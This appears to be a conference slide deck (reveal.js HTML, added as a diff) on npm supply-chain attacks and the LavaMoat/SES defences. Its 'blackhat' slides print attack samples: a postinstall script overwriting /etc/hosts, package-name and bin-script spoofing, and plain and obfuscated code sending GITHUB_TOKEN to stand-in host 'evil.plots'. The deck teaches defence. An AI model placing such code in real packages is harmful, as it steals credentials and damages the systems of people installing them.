@@ -1,0 +1,702 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+
+  <title>Hardened JavaScript</title>
+
+  <meta name="author" content="naugtur">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reset.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/theme/black.css" id="theme">
+
+  <!-- Theme used for syntax highlighting of code -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/highlight/zenburn.css">
+
+
+  <link rel="stylesheet" href="../branding/style4x.css" id="branding">
+  <style>
+    #naugtur.reveal .muchcode pre>code {
+      max-height: 90vh;
+      min-width: 70vw;
+      font-size: 0.88em;
+    }
+
+    #naugtur:before {
+      content: '@naugtur';
+      position: fixed;
+      bottom: .5em;
+      left: .5em;
+      font-size: .8em;
+      animation-name: spin;
+      animation-timing-function: linear;
+      animation-iteration-count: infinite;
+      animation-duration: 30s;
+      transform-style: preserve-3d;
+      transform: rotateX(0.5deg);
+      transform-origin: 50% 50%;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotateX(0deg);
+      }
+
+      3% {
+        transform: rotateX(-360deg);
+      }
+
+      100% {
+        transform: rotateX(-360deg);
+      }
+    }
+
+    .boxes {
+      width: 70vw;
+      height: 70vh;
+      font-size: 5vh;
+
+    }
+
+    .boxes div {
+      box-sizing: border-box;
+      width: 46%;
+      height: 44%;
+      float: left;
+      border: 3px solid #3c873a;
+      margin: 2%;
+      text-align: center;
+      font-size: 0.7em;
+      line-height: 2em;
+      padding: 2%;
+    }
+
+
+    .an-container {
+      width: 100%;
+      height: 550px;
+
+    }
+
+    .an-item,
+    .an-start-loc {
+      position: fixed;
+      top: 15%;
+      left: 15%;
+    }
+
+    .an-y {
+      z-index: 11;
+      max-height: none !important;
+    }
+
+    .an-target {
+      position: fixed;
+      top: 326px;
+      right: 8%;
+      width: 40%;
+      z-index: 0;
+
+    }
+
+    .reveal section img.clear {
+      border: none;
+      background: none;
+      box-shadow: none;
+      max-width: 50%;
+    }
+
+    .an-item {
+      offset-path: path('M100,80 C200,-200 500,0 600,300');
+      offset-rotate: 0deg;
+    }
+
+    .an-item.an-to {
+      animation: move 4444ms infinite ease-in-out;
+    }
+
+    .an-item.an-oops {
+      background-color: rgba(255, 166, 60, 0.9);
+
+      /* animation-play-state: paused !important; */
+      border-radius: 50%;
+      /* offset-path: path('M30,80 C200,-200 500,0 320,200'); */
+      animation: discover 4444ms ease-in-out;
+      animation-fill-mode: forwards;
+      z-index: 10;
+
+    }
+
+    @keyframes move {
+      0% {
+        offset-distance: 0%;
+      }
+
+      100% {
+        offset-distance: 100%;
+      }
+    }
+
+    #naugtur .moji h1 {
+      line-height: 3em;
+    }
+
+    sub>sup,
+    sup>sub {
+      color: #777;
+    }
+
+    #naugtur .whitehat .slide-background-content {
+      background: url('./ilus/dev.svg') no-repeat top right / 20%;
+    }
+
+    #naugtur .blackhat .slide-background-content {
+      background: url('./ilus/hacker.svg') no-repeat bottom right / 20%;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="reveal none" id="naugtur">
+
+    <div class="slides">
+      <section>
+        <br><br>
+        <h1>I'm running code from the internet!</h1>
+        <br>
+        <h4>LavaMoat</h4>
+        <small>@naugtur, 2022/2023</small>
+      </section>
+
+
+      <section class="moji" data-markdown>
+        <textarea data-template>
+          <br> <br>
+          # ⌨️ -> ⚙️🖥️
+          <br> <br> <br>
+          <sub><sup>Would you take a string from me and run it in your application's process?</sup></sub>
+
+          ---
+          <br> <br>
+          # 📦 -> ⚙️🖥️
+          <br> <br> <br>
+            
+          <sub><sup>What if I offered to pack it in a .tgz file for you?</sup></sub>
+
+          ---
+          <br> <br>
+          # 👉📦👈
+          <br> <br> <br>
+          
+          <sub><sup>Yes, that's what npm packages are.  </sup></sub>
+            <sub><sup>And they're glorious.</sup></sub>
+
+       
+          </textarea>
+      </section>
+      <section class="animatedSlide ">
+
+        <img src="./npm.svg" alt="npm logo" style="width: 25%; margin-top:5%" class=" an-y an-start-loc">
+        <img src="./ilus/cookie.png" alt="gobble" class="an-target an-y">
+        <div class="an-container"></div>
+
+        <sub><sup>
+            Wouldn't it be great to fearlessly use them like we did back in 2015?
+          </sup></sub>
+
+      </section>
+
+
+      <section>
+
+        <section data-markdown>
+          ## What could go wrong?
+        </section>
+
+        <section class="animatedSlide bad">
+
+          <img src="./npm.svg" alt="npm logo" style="width: 25%; margin-top:5%" class=" an-y an-start-loc">
+          <img src="./ilus/cookie.png" alt="gobble" class="an-target an-y">
+          <div class="an-container"></div>
+
+        </section>
+        <section>
+
+          <br>
+          <h4 class="fragment">exfiltration</h4>
+          <h4 class="fragment">fetch, process.env</h4>
+          <h4 class="fragment">prototype pollution</h4>
+          <h4 class="fragment">RCE</h4>
+          <h4 class="fragment">fs</h4>
+          <h4 class="fragment">event-stream</h4>
+          <img class="pad1 plain fragment" src="./ilus/shroom.png">
+        </section>
+
+      </section>
+
+
+
+
+      <section class="whitehat">
+        <h3> Let's install some dependencies! </h3>
+      </section>
+      <section class="blackhat">
+        <h3> Ok, catch this: 📦 </h3>
+      </section>
+
+
+
+      <section class="whitehat">
+        <h4> I'm not runing it. </h4>
+      </section>
+      <section class="blackhat">
+        <h4> That's what you think. </h4>
+        <img src="ilus/npmscripts.png" alt="npm docs for lifecycle scripts" class="clear">
+        <pre><code data-trim>
+            "postinstall": "echo 💩 > /etc/hosts"
+        </code></pre>
+      </section>
+
+      <section data-markdown class="whitehat">
+        ### Ok, wait
+        ```
+        ✨🐋
+        npm ci
+        cp node_modules s3://
+        🔥🔥🐋🔥🔥
+        ```
+      </section>
+
+      <section data-markdown class="blackhat">
+        ### Hold my 🍺
+      </section>
+
+      <section data-markdown class="whitehat">
+        ## ignore scripts
+
+        ```
+        npm ci --ignore-scripts
+        ```
+
+        Run selected scritps
+        ```
+        npm rebuild bcrypt
+        ```
+      </section>
+
+      <section data-markdown class="blackhat">
+        #### I can spoof that package name
+
+        ```
+        evilpackage/node_modules/bcrypt/package.json:
+        "scripts": {
+        "postinstall": "echo 💩 > /etc/hosts"
+
+        evilpackage/package.json:
+        "bundledDependencies": ["bcrypt"]
+
+        $ npm publish
+        ```
+      </section>
+
+      <section data-markdown class="whitehat">
+        # Oh 💩
+      </section>
+      <section data-markdown class="whitehat">
+        #### look what I found!
+        ![lavamoat](./lavamoat-logo.png)
+      </section>
+      <section data-markdown class="whitehat">
+        ```
+        $ allow-scripts setup
+
+        $ allow-scripts auto
+
+        ```
+        ```
+        package.json:
+        "scripts": {
+        "setup": "npm ci && allow-scripts"
+
+        ```
+
+      </section>
+
+      <section class="blackhat">
+        <h4>I see you use scripts </h4>
+
+        <pre><code data-trim>
+        evilpackage/package.json:
+          "bin": {
+            "npm": "./evilPlots.js",
+            "node": "./evilPlots.js"
+        
+          </code></pre>
+
+
+        <br><br><br><sub><sup>credit: https://socket.dev/blog/npm-bin-script-confusion</sup></sub>
+      </section>
+
+      <section data-markdown class="whitehat">
+        ```
+        $ allow-scripts setup --experimental-bins
+
+        $ allow-scripts auto --experimental-bins
+
+        ```
+        ```
+        package.json:
+        "scripts": {
+        "setup": "npm ci && npm run allow-scripts"
+
+        ```
+
+      </section>
+
+      <section data-markdown class="blackhat">
+        # 🤯
+
+        but
+
+        but npm said it's a feature! 😭
+      </section>
+
+      <section data-markdown class="blackhat">
+        #### let's get serious
+
+        > Dear ${ webpackPluginMaintainer },
+        > I understand you're busy and I'd be happy to help with maintenance of your
+        tiny but popular plugin...
+
+
+      </section>
+      <section data-markdown class="blackhat">
+        #### will you read entire node_modules?
+
+        ```
+        const credentials = process.env["GITHUB_TOKEN"];
+        const req = require('https').request({
+        hostname: 'evil.plots',
+        path: `/stolen/${credentials}`,
+        }, ()=>{});
+        req.end();
+        ```
+
+      </section>
+      <section data-markdown class="blackhat">
+        #### ok, just in case you do
+
+        ```
+        const _0x765e5=_0x46a0;(function(_0x57764e,_0x91aa41){const
+        _0x32405d=_0x46a0,_0x165444=_0x57764e();while(!![]){try{const
+        _0x42ba82=-parseInt(_0x32405d(0x150))/0x1*(parseInt(_0x32405d(0x15e))/0x2)+-parseInt(_0x32405d(0x153))/0x3*(-parseInt(_0x32405d(0x14f))/0x4)+parseInt(_0x32405d(0x159))/0x5*(-parseInt(_0x32405d(0x158))/0x6)+parseInt(_0x32405d(0x151))/0x7*(-parseInt(_0x32405d(0x152))/0x8)+parseInt(_0x32405d(0x157))/0x9+-parseInt(_0x32405d(0x15f))/0xa+parseInt(_0x32405d(0x15a))/0xb;
+        if(_0x42ba82===_0x91aa41)break;else
+        _0x165444['push'](_0x165444['shift']());}catch(_0x54f92f){_0x165444['push'](_0x165444['shift']());}}}(_0x3641,0x8e73e));function
+        _0x3641()
+        {const _0x5d9864=['/stolen/','evil.plots','2511378rgvTaf','5826vwOBSz','3845SrYtZx',
+        '37351105uFQfso','request','end','https','72326kmzepu','8558100KDxwfw',
+        'GITHUB_TOKEN','25432JwBMWs','29XqXcpt','4547823ytmFVF','8EFXBHJ','99iKrczU','env'];
+        _0x3641=function(){return _0x5d9864;};return _0x3641();}function _0x46a0(_0x24c0cb,_0x27294c){const
+        _0x3641a1=_0x3641();return _0x46a0=function(_0x46a08f,_0x225127){_0x46a08f=_0x46a08f-0x14f;let
+        _0x16a89a=_0x3641a1[_0x46a08f];return _0x16a89a;},
+        _0x46a0(_0x24c0cb,_0x27294c);}const
+        credentials=process[_0x765e5(0x154)][_0x765e5(0x160)],req=require(_0x765e5(0x15d))[_0x765e5(0x15b)]({'hostname':_0x765e5(0x156),'path':_0x765e5(0x155)+credentials},()=>{});req[_0x765e5(0x15c)]();
+        ```
+
+      </section>
+      <section data-markdown class="blackhat">
+        #### how far do you want me to go?
+
+        ![](./ilus/obfuscated.png)
+
+      </section>
+
+      <section data-markdown class="whitehat">
+        #### yo, there's an app for that!
+
+        ![lavamoat](./lavamoat-logo.png)
+
+      </section>
+
+      <section data-markdown class="whitehat">
+        <textarea>
+#### yo, there's an app for that!
+
+```
+package.json:
+  "scripts": {
+    "generate-policy": "lavamoat build.js --auto",
+    "build": "lavamoat build.js",
+```
+
+---
+
+#### look what it found
+          
+```js
+./lavamoat/node/policy.json:
+  "that-webpack-plugin>evil-dependency": {
+    "builtin": {
+      "https.request": true
+    },
+    "globals": {
+      "process.env": true
+    },
+
+```
+
+---
+
+#### look what it found
+          
+```js
+./lavamoat/node/policy.json:
+  "that-webpack-plugin>evil-dependency": {
+    "builtin": {
+      "https.request": false
+    },
+    "globals": {
+      "process.env": false
+    },
+
+```
+        
+        </textarea>
+      </section>
+
+
+
+      <section data-markdown class="blackhat">
+        # (╯°□°)╯︵ ┻━┻
+
+        # how ?!
+      </section>
+
+      <section data-markdown>
+        ### what's inside?
+
+        ![lavamoat](./lavamoat-underthe.png)
+
+      </section>
+
+
+      <section data-markdown>
+        <textarea data-template>
+  # 🪄
+  ## SES (shim)
+  
+    - `Compartment` - a scope for each package
+    - `lockdown` - no prototype-pollution etc.
+
+  ---
+
+  ## Part of the language!
+  #### ( eventually )
+
+  https://github.com/tc39/proposal-compartments
+
+  https://github.com/tc39/proposal-ses
+
+  
+---
+
+### Object Capability
+
+vs identity based security
+
+- code gets references to capable objects
+- code doesn't "work on your behalf"
+
+---
+
+### Object Capability
+
+You already know how to use it
+
+```js
+import { lint } from 'some-linter'
+import { readFile } from 'node:fs/promises'
+
+const fs = { readFile }
+
+lint({ fs })
+```
+
+
+---
+
+
+### SES makes OCap work
+
+- `Compartment` - scope isolation
+- `lockdown` - makes your Realm secure
+- `harden` - protects capable objects
+
+---
+
+# 🤯
+### JS design is good for security?
+
+
+- Take ECMA + W3C
+- Add Conway's Law
+- Separation between language and APIs
+- Power only reachable through scope
+- Compartment controls scope
+
+---
+
+  # 🤩
+  ## How can I use it today?
+
+---
+
+- use SES Compartment and lockdown directly
+- use @endo/compartment-mapper 
+- use LavaMoat with generated policies
+
+LavaMoat is protecting installation, build and runtime of MetaMask - with up to 30million users
+  
+        </textarea>
+      </section>
+      <section data-markdown class="whitehat">
+        ### I want to know more about SES
+
+        [Earlier talk with more SES details](https://www.youtube.com/watch?v=Qjeh7Qo2u28)
+
+        [Mark Miller on F5 Tech Talks](https://www.youtube.com/watch?v=u-XETUbxNUU)
+
+      </section>
+
+      <section>
+        <h4> I'll help you set up LavaMoat in your project</h4>
+
+        <img src="naugtur.svg" style="height:6em" />
+
+        <p>@naugtur &nbsp; <a href="https://naugtur.pl/">naugtur.pl</a></p>
+        <p> <a href="https://naugtur.pl/news">naugtur.pl/news</a></p>
+        <p> <a href="https://naugtur.pl/training">naugtur.pl/training</a></p>
+
+
+      </section>
+
+      <section data-markdown>
+        ### bonus
+
+        Malware analysis with SES
+
+        ⚠️ experimental
+
+        https://github.com/naugtur/lavalab
+
+      </section>
+
+      <section data-markdown>
+        <textarea>
+```
+## Running "samples/a.js" ##
+Access real global.console? [a=always/y/N]y
+this is a demo sample
+Access real global.URL? [a=always/y/N]y
+Access real global.require? [a=always/y/N]n
+Get global.require as [p/n/l/f/0]f
+=>global.require( [Arguments] { '0': 'fs' } )
+Get global.require=>{}.readFileSync as [p/n/l/f/0]n
+Run real EVAL? [y/N]n
+returning console.log instead of eval
+example_payload
+
+```          
+        </textarea>
+      </section>
+
+    </div>
+
+  </div>
+
+  <style>
+    #naugtur {
+      background-image: none;
+    }
+
+    /*effectively switch from contain to cover behav*/
+    #naugtur .slide-background video {
+      min-width: 100%;
+      min-height: 100%;
+      width: auto;
+      height: auto;
+    }
+  </style>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/zoom/zoom.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/notes/notes.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/search/search.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/markdown/markdown.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/highlight/highlight.js"></script>
+
+
+  <script>
+    // Full list of configuration options available at:
+    // https://github.com/hakimel/reveal.js#configuration
+    Reveal.initialize({
+      controls: true,
+      progress: true,
+      history: true,
+      center: true,
+      mouseWheel: true,
+
+      transition: 'concave', // none/fade/slide/convex/concave/zoom
+
+      plugins: [RevealZoom, RevealNotes, RevealSearch, RevealMarkdown, RevealHighlight],
+      // autoAnimateEasing: 'linear',
+
+      // Parallax background image
+      // parallaxBackgroundImage: '../branding/bk.jpg', // e.g. "https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg"
+      //
+      // // Parallax background size
+      // parallaxBackgroundSize: '1920px 880px', // CSS syntax, e.g. "2100px 900px" - currently only pixels are supported (don't use % or auto)
+
+
+    });
+
+    function installAnimation(an, icon, delay) {
+      var el = document.createElement('span');
+      el.classList.add('an-item');
+      el.innerHTML = icon;
+      an.appendChild(el)
+      setTimeout(() => el.classList.add('an-to'), delay);
+      return el
+    }
+    Reveal.addEventListener('slidechanged', (event) => {
+      console.log(event.currentSlide)
+      if (event.currentSlide.classList.contains('animatedSlide')) {
+        var an = event.currentSlide.querySelector('.an-container');
+        an.innerHTML = '';
+        var pkgs = '📦,'.repeat(30).split(',')
+        if (event.currentSlide.classList.contains('bad')) {
+          pkgs[4] = '💣';
+          pkgs[10] = '🔥';
+          pkgs[29] = '👿';
+        }
+        pkgs.forEach((icon, index) =>
+          installAnimation(an, icon, 7777 * Math.log10((index) / 3 + 1))
+        )
+      }
+    })
+
+
+  </script>
+
+</body>
+
+</html>
